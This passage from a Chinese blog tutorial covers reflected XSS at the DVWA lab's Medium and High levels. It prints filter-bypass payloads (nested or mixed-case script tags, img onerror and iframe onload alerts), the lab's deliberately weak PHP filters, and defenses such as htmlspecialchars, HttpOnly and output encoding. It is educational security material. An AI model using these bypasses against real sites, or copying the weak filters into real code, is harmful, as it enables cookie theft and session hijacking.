<p> <strong>document.location</strong> 包含 href 属性，直接取值赋值时相当于 document.location.href。<br>document.location.href 当前页面完整 URL </p>
</li>
</ul>
<h3 id="2-2-反射型XSS-Medium等级"><a href="#2-2-反射型XSS-Medium等级" class="headerlink" title="2.2 反射型XSS-Medium等级"></a>2.2 反射型XSS-Medium等级</h3><ul>
<li><p><strong>先利用alert进行弹窗测试</strong> </p>
<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss05.png" alt=""></p>
<p><strong>发现页面没有反应，有可能是被过滤了，浏览器虽然会过滤·<code>&lt;script&gt;</code>标签关键字，但是只过滤一次，所以可以想办法绕过</strong> </p>
</li>
<li><p>绕过1： 通过构造两个标签，即嵌套</p>
<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss06.png" alt=""></p>
<p> <strong>出现弹窗，说明存xss</strong> </p>
</li>
<li><p>绕过2：<strong>也可以大小写混写进行绕过</strong> </p>
<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss07.png" alt=""></p>
<p><strong>出现弹窗，说明存在xss</strong> </p>
</li>
<li><p><strong>然后利用js代码获取cookie,成功拿到cookie</strong> </p>
</li>
<li><p>源代码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>str_replace()对<code>&lt;script&gt;</code>进行了过滤‘</li>
</ul>
</li>
</ul>
<h3 id="2-3-反射型XSS-High等级"><a href="#2-3-反射型XSS-High等级" class="headerlink" title="2.3 反射型XSS-High等级"></a>2.3 反射型XSS-High等级</h3><ul>
<li><p><strong>还是先利用弹窗测试是否存在xss,像low和medium等级那样操作发现页面并没有出现弹窗。</strong> </p>
</li>
<li><p><strong>接下来我们换个标签，img标签和iframe标签（在一个HTML中嵌入另一个HTML）</strong> </p>
</li>
<li><p>Img：<code>&lt;img src=x onerror=alert(1)&gt;</code></p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss02.png" alt=""></p>
<ul>
<li><p>Iframe: <code>&lt;iframe onload=alert(1)&gt;</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss08.png" alt=""></p>
</li>
<li><p><strong>两个都成功的出现弹窗</strong> </p>
</li>
<li><p>源代码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>利用preg_replace()正则表达过滤掉所有形式的<code>&lt;script&gt;</code></li>
</ul>
</li>
<li><p>观察下面反射型xss-impossible等级代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// Is there any input?</span></span><br><span class="line">  <span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>代码采用了Anti-CSRF token机制</li>
<li>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</li>
<li>预定义的字符是：<ul>
<li>&amp; （和号）成为 &amp;</li>
<li>“ （双引号）成为 “</li>
<li>‘ （单引号）成为 ‘</li>
<li>&lt; （小于）成为 &lt;</li>
<li>&gt; （大于）成为 &gt;</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="3-1-HttpOnly-防止劫取-Cookie"><a href="#3-1-HttpOnly-防止劫取-Cookie" class="headerlink" title="3.1 HttpOnly 防止劫取 Cookie"></a>3.1 <strong>HttpOnly 防止劫取 Cookie</strong></h3><ul>
<li>攻击者可以通过注入恶意脚本获取用户的 Cookie 信息。通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。 </li>
</ul>
<h3 id="3-2-用户端输入检查"><a href="#3-2-用户端输入检查" class="headerlink" title="3.2 用户端输入检查"></a>3.2 <strong>用户端输入检查</strong></h3><ul>
<li><p>对于用户的任何输入要进行检查、过滤和转义。</p>
</li>
<li><p>建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。 </p>
</li>
<li><p>HTML转义：对用户输入的内容进行HTML转义，转义后可以确保用户输入的内容在浏览器中作为文本显示，而不是作为代码解析。 </p>
</li>
<li><p>一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; vuejs 中的 decodingMap</span><br><span class="line">&#x2F;&#x2F; 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉</span><br><span class="line">const decodingMap &#x3D; &#123;</span><br><span class="line">  &#39;&lt;&#39;: &#39;&lt;&#39;,</span><br><span class="line">  &#39;&gt;&#39;: &#39;&gt;&#39;,</span><br><span class="line">  &#39;&quot;&#39;: &#39;&quot;&#39;,</span><br><span class="line">  &#39;&amp;&#39;: &#39;&amp;&#39;,</span><br><span class="line">  &#39;</span><br><span class="line">  &#39;: &#39;\n&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="3-3-服务端输出检查"><a href="#3-3-服务端输出检查" class="headerlink" title="3.3 服务端输出检查"></a><strong>3.3 服务端输出检查</strong></h3><ul>
<li>用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。 </li>
</ul>

          
            <br>
            
  
    
    

<section class="widget copyright  desktop mobile">
  <div class='content'>
    
      <blockquote>
        
          
            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>

          
        
          
            <p>本文永久链接是：<a href=https://fishni.github.io/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/>https://fishni.github.io/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/</a></p>
          
        
      </blockquote>
    
  </div>
</section>

  

  
    
    

<section class="widget qrcode  desktop mobile">
  

  <div class='content article-entry'>
    
      
        <div class='fancybox'><img src='https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/wechat.jpg'
        
          height='64px'
        ></div>
      
    
      
        <div class='fancybox'><img src='https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/qq.jpg'
        
          height='64px'
        ></div>
      
    
  </div>
</section>

  


          
        </div>
        
          


  <section class='meta' id="footer-meta">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-14T16:52:36+08:00">
  <a class='notlink'>
    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
    <p>更新于：2020年4月14日</p>
  </a>
</div>

        
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/PHP/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>PHP</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/XSS/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>XSS</p></a></div>


        
      
        
          

        
      
        
          
  <div class="new-meta-item share -mob-share-list">
  <div class="-mob-share-list share-body">
    
      
        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
          
          href="http://connect.qq.com/widget/shareqq/index.html?url=https://fishni.github.io/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/&title=【XSS（一）】1.1 XSS介绍与原理 - fishni&summary=本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。"
          
          >
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qq.png">
          
        </a>
      
    
      
        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
          
          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://fishni.github.io/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/&title=【XSS（一）】1.1 XSS介绍与原理 - fishni&summary=本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。"
          
          >
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qzone.png">
          
        </a>
      
    
      
        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
          
          href="http://service.weibo.com/share/share.php?url=https://fishni.github.io/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/&title=【XSS（一）】1.1 XSS介绍与原理 - fishni&summary=本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。"
          
          >
          
            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/weibo.png">
          
        </a>
      
    
  </div>
</div>



        
      
    </div>
  </section>


        
        
          <div class="prev-next">
            
              <a class='prev' href='/2020/04/08/1.5%20python-Web%E5%8A%A8%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1/'>
                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>【python-Web服务器】1.5 python-Web动态服务器-1</p>
                <p class='content'>本文主要内容
服务器动态资源请求相关知识（WSGI）
python实现Web动态服务器示例



0x01 服务器动态资源请求1.1 浏览器请求动态页面过程
1.2 WSGI
Web服务器网关接...</p>
              </a>
            
            
              <a class='next' href='/2020/04/06/1.2%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1-%E6%98%BE%E7%A4%BA%E5%9B%BA%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2/'>
                <p class='title'>【python-Web服务器】1.2 python-Web静态服务器-1-显示固定的页面<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
                <p class='content'>本文使用python写个简单的Web静态服务器


12345678910111213141516171819202122232425262728293031323334# coding: ut...</p>
              </a>
            
          </div>
        
      </section>
    </article>
  

  
    <!-- 显示推荐文章和评论 -->



  


  




<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->



  <script>
    window.subData = {
      title: '【XSS（一）】1.1 XSS介绍与原理',
      tools: true
    }
  </script>


</div>
<aside class='l_side'>
  
  

  
    
    


  <section class="widget toc-wrapper shadow desktop mobile">
    
  <header>
    
      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
    
  </header>


    <div class='content'>
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基础知识"><span class="toc-text">0x01 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-XSS简介"><span class="toc-text">1.1 XSS简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-XSS分类"><span class="toc-text">1.2 XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#反射型"><span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#存储型"><span class="toc-text">存储型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM型"><span class="toc-text">DOM型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-XSS-利用方式"><span class="toc-text">1.3 XSS 利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookies-窃取"><span class="toc-text">Cookies 窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#会话劫持"><span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#钓鱼"><span class="toc-text">钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#网页挂马"><span class="toc-text">网页挂马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOS-与-DDOS¶"><span class="toc-text">DOS 与 DDOS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-蠕虫-¶"><span class="toc-text">XSS 蠕虫 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Self-XSS-变废为宝的场景-¶"><span class="toc-text">Self-XSS 变废为宝的场景 </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-正则表达式规则"><span class="toc-text">1.4 正则表达式规则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-简单实例分析"><span class="toc-text">0x02 简单实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-反射型XSS-Low等级"><span class="toc-text">2.1 反射型XSS-Low等级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-反射型XSS-Medium等级"><span class="toc-text">2.2 反射型XSS-Medium等级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-反射型XSS-High等级"><span class="toc-text">2.3 反射型XSS-High等级</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-防范措施"><span class="toc-text">0x03 防范措施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-HttpOnly-防止劫取-Cookie"><span class="toc-text">3.1 HttpOnly 防止劫取 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-用户端输入检查"><span class="toc-text">3.2 用户端输入检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-服务端输出检查"><span class="toc-text">3.3 服务端输出检查</span></a></li></ol></li></ol>
    </div>
  </section>


  


</aside>


  
  <footer class="clearfix">
    <br><br>
    
      
        <div class="aplayer-container">
          


        </div>
      
    
      
        <br>
        <div class="social-wrapper">
          
            
              <a href="https://fishni.github.io/"
                class="social fas fa-rss flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
            
          
            
              <a href="https://github.com/fishni"
                class="social fab fa-github flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
        </div>
      
    
      
        <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
</div>
      
    
      
        本站使用
        <a href="https://volantis.js.org/" target="_blank" class="codename">fishni's blog</a>
        作为主题
        
          ，
          总访问量为
          <span id="busuanzi_value_site_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span>
          次
        
      
    
      
        <div class='copyright'>
        <p><a href="https://fishni.github.io/">Copyright © 2017-2020 Mr.fishmouse</a></p>

        </div>
      
    
  </footer>

<script>setLoadingBarProgress(80);</script>


      <script>setLoadingBarProgress(60);</script>
    </div>
    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
  </div>
  
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>


  <script>
    
    var SEARCH_SERVICE = "hexo" || "hexo";
    var ROOT = "/" || "/";
    if (!ROOT.endsWith('/')) ROOT += '/';
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>



  
<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>

  <script type="text/javascript">
    $(function() {
      Waves.attach('.flat-btn', ['waves-button']);
      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
      Waves.attach('.flat-box', ['waves-block']);
      Waves.attach('.float-box', ['waves-block', 'waves-float']);
      Waves.attach('.waves-image');
      Waves.init();
    });
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>



  
  
  
    
<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>

    <script type="text/javascript">
      $(function(){
        var imgs=["https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20718gongsenkui02.jpg"];
        if ('true' == 'true') {
          function shuffle(arr){
            /*From countercurrent-time*/
            var n = arr.length;
            while(n--) {
              var index = Math.floor(Math.random() * n);
              var temp = arr[index];
              arr[index] = arr[n];
              arr[n] = temp;
            }
          }
          shuffle(imgs);
        }
        if ('') {
          $('').backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        } else {
          $.backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        }
      });
    </script>
  












  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.2.1/js/app.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.1/js/search.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>



<!-- 复制 -->

  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copyed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-clipboard-check');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPYED';
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-exclamation-triangle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
      });
    }
    initCopyCode();
  }(window, document);
</script>




<!-- fancybox -->

  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
  let LAZY_LOAD_IMAGE = "";
  $(".article-entry").find("div.fancybox").find("img").each(function () {
      var element = document.createElement("a");
      $(element).attr("data-fancybox", "gallery");
      $(element).attr("href", $(this).attr("src"));
      /* 图片采用懒加载处理时,
       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
       * 那么此处将原本的属性名src替换为对应属性名data-original,
       * 修改如下
       */
       if (LAZY_LOAD_IMAGE) {
         $(element).attr("href", $(this).attr("data-original"));
       }
      $(this).wrap(element);
  });
</script>






  <script>setLoadingBarProgress(100);</script>
</body>
</html>
